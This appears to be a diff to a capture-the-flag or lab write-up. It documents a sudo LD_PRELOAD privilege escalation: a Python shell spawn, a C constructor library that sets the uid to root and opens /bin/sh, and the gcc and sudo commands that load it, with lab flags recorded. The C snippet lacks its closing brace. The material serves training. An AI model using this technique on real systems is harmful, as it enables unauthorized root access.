@@ -244,13 +244,51 @@ ssh robert@server3.ine.local
 
 **FLAG 2**: EC2986081E84BB845541D5CC0BEE13B3
 
+-l list user privileges
 ```
 sudo -l
 ```
 
-robert can run ls with sudo 
+robert can run ls with sudo<br>
+LD_PRELOAD var is also set
 
 ![3.8](./imgs/3.8.png)
 
+Get interactive shell
 ```
+python -c 'import os; os.system("/bin/sh")'
 ```
+
+Write C library code called shell.c
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+__attribute__((constructor))
+void exploit() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+```
+
+__attribute__((constructor)) will make exploit() run before all other code<br>
+unsetenv will reset the LD_PRELOAD env var<br>
+setgid and setuid will be set to 0 which is root<br>
+
+Create shared library file calld shell.so
+```
+gcc -fPIC -shared -o shell.so shell.c
+file shell.so
+```
+
+![3.11](./imgs/3.11.png)
+
+Run ls command with shared library
+```
+sudo LD_PRELOAD=/home/robert/shell.so ls
+```
+
+![3.12](./imgs/3.12.png)
+
+**FLAG 3**: 560648FC63F090A8CF776326DC13FAC7
